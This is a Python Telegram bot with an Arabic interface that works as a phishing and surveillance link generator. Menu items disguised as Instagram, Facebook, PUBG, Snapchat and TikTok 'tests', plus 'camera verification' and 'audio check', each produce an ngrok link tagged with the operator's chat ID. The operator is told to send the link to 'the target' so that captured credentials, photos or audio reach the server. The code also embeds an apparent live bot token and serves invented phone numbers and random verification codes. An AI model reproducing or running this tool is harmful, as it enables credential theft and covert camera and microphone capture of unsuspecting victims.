import telebot
from telebot import types
import random
from datetime import datetime

TOKEN = "8805386848:AAHPNJOMnOgXBfL_sA4sXKVgPiDSiBBBBy0"
bot = telebot.TeleBot(TOKEN)

DECORATIONS = [
    "꧁༺ 𝓡𝓸𝔂𝓪𝓵 ༻꧂",
    "✨ 𝔸𝕀 𝕄𝔼𝕌ℕℍℝ𝔼𝔽 ✨",
    "◥ ツ 𝔸ℍ𝕄𝔼𝔻 ツ ◤",
    "༺ الـمُـحْـرِف ⚡ 👑",
    "🔥 𝔽𝔸ℂ𝔼𝔹𝕆𝕆𝕂 𝕍𝕀ℙ 🔥",
    "💎 𝗠𝗘𝗨𝗡𝗛𝗥𝗘𝗙 𝗢𝗙𝗙𝗜𝗖𝗜𝗔𝗟 💎"
]

FAKE_NUMBERS = [
    {"name": "فرنسا", "code": "+33", "num": "+33644627861"},
    {"name": "الولايات المتحدة", "code": "+1", "num": "+12025550143"},
    {"name": "المملكة المتحدة", "code": "+44", "num": "+447911123456"},
    {"name": "ألمانيا", "code": "+49", "num": "+4915123456789"},
    {"name": "كندا", "code": "+1", "num": "+14165550198"}
]

@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = types.InlineKeyboardMarkup(row_width=2)
    
    btn_insta = types.InlineKeyboardButton("📸 اختبار انستغرام", callback_data="instamon")
    btn_face = types.InlineKeyboardButton("📘 اختبار فيسبوك", callback_data="fesmon")
    btn_pubg = types.InlineKeyboardButton("🎮 شدات ببجي (pgmon)", callback_data="pgmon")
    btn_snap = types.InlineKeyboardButton("👻 متابعين سناب شات", callback_data="snapmon")
    btn_tiktok = types.InlineKeyboardButton("🎵 متابعين تيك توك", callback_data="tkmon")
    btn_numbers = types.InlineKeyboardButton("📞 الأرقام الوهمية (nbmon)", callback_data="nbmon")
    btn_audio = types.InlineKeyboardButton("🎙️ الفحص الصوتي (mokmon)", callback_data="mokmon")
    btn_frontcam = types.InlineKeyboardButton("📷 توثيق الكاميرا الأمامية", callback_data="cammon")
    btn_backcam = types.InlineKeyboardButton("📸 توثيق الكاميرا الخلفية", callback_data="camkmon")
    btn_decor = types.InlineKeyboardButton("✒️ تحويل زخرفة الأسماء", callback_data="decorations")
    btn_vip = types.InlineKeyboardButton("⭐ الاختبار المتقدم VIP", callback_data="vip_test")
    
    markup.add(btn_insta, btn_face, btn_pubg, btn_snap, btn_tiktok, btn_numbers, btn_audio, btn_frontcam, btn_backcam, btn_decor, btn_vip)
    
    bot.send_message(
        message.chat.id, 
        "أهلاً بك في اللوحة المركزية الشاملة للخدمات والاختبارات.\nاختر القسم المطلوب أدناه لإنشاء الرابط الفوري الخاص بك:", 
        reply_markup=markup
    )

@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    chat_id = call.message.chat.id
    
    if call.data in ["instamon", "fesmon", "pgmon", "snapmon", "tkmon", "mokmon", "cammon", "camkmon"]:
        unique_link = f"https://stir-idly-wildly.ngrok-free.dev  / {call.data}/index.php?chat_id={chat_id}"
        bot.answer_callback_query(call.id, "تم إنشاء الرابط بنجاح!")
        bot.send_message(
            chat_id, 
            f"✅ تم إنشاء رابط الخدمة بنجاح!\n\n🔗 الرابط المخصص لك:\n{unique_link}\n\nيرجى إرسال هذا الرابط للهدف، وسيتم حفظ البيانات أو الوسائط الملتقطة فوراً على السيرفر."
        )

    elif call.data == "nbmon":
        country = random.choice(FAKE_NUMBERS)
        now = datetime.now()
        text = f"📳 *تم الطلب 🔔*\n" \
               f"📞 رقم الهاتف : {country['num']}\n" \
               f"🇫🇷 الدوله : {country['name']}\n" \
               f"🌐 رمز الدوله : {country['code']}\n" \
               f"🟣 المنصه : لجميع الموقع والبرامج\n" \
               f"📅 تاريخ الانشاء : {now.strftime('%Y-%m-%d')}\n" \
               f"⏰ وقت الانشاء : {now.strftime('%I:%M:%S %p')}\n" \
               f"📌 اضغط على الرقم لنسخه."
        
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            types.InlineKeyboardButton("🔄 تغير الرقم", callback_data="nbmon"),
            types.InlineKeyboardButton("💬 طلب الكود", callback_data="get_fake_code")
        )
        bot.send_message(chat_id, text, parse_mode="Markdown", reply_markup=markup)

    elif call.data == "get_fake_code":
        code = random.randint(100000, 999999)
        bot.answer_callback_query(call.id, f"كود التحقق: {code}")
        bot.send_message(chat_id, f"💬 الكود الوهمي المُستلم: {code}", parse_mode="Markdown")

    elif call.data == "decorations":
        dec_text = "✒️ *قائمة الزخارف الجاهزة للاستخدام:*\n\n" + "\n".join([f"{d}" for d in DECORATIONS])
        bot.answer_callback_query(call.id, "تم جلب الزخارف بنجاح")
        bot.send_message(chat_id, dec_text, parse_mode="Markdown")

    elif call.data == "vip_test":
        bot.answer_callback_query(call.id, "قريباً جداً!", show_alert=True)
        bot.send_message(chat_id, "⭐ *الاختبار المتقدم VIP* قيد التطوير والتحديث حالياً، سيتم إطلاق الميزات الحصرية قريباً جداً في التحديث القادم!", parse_mode="Markdown")

if __name__ == '__main__':
    print("البوت يعمل الآن بنجاح...")
    bot.infinity_polling()
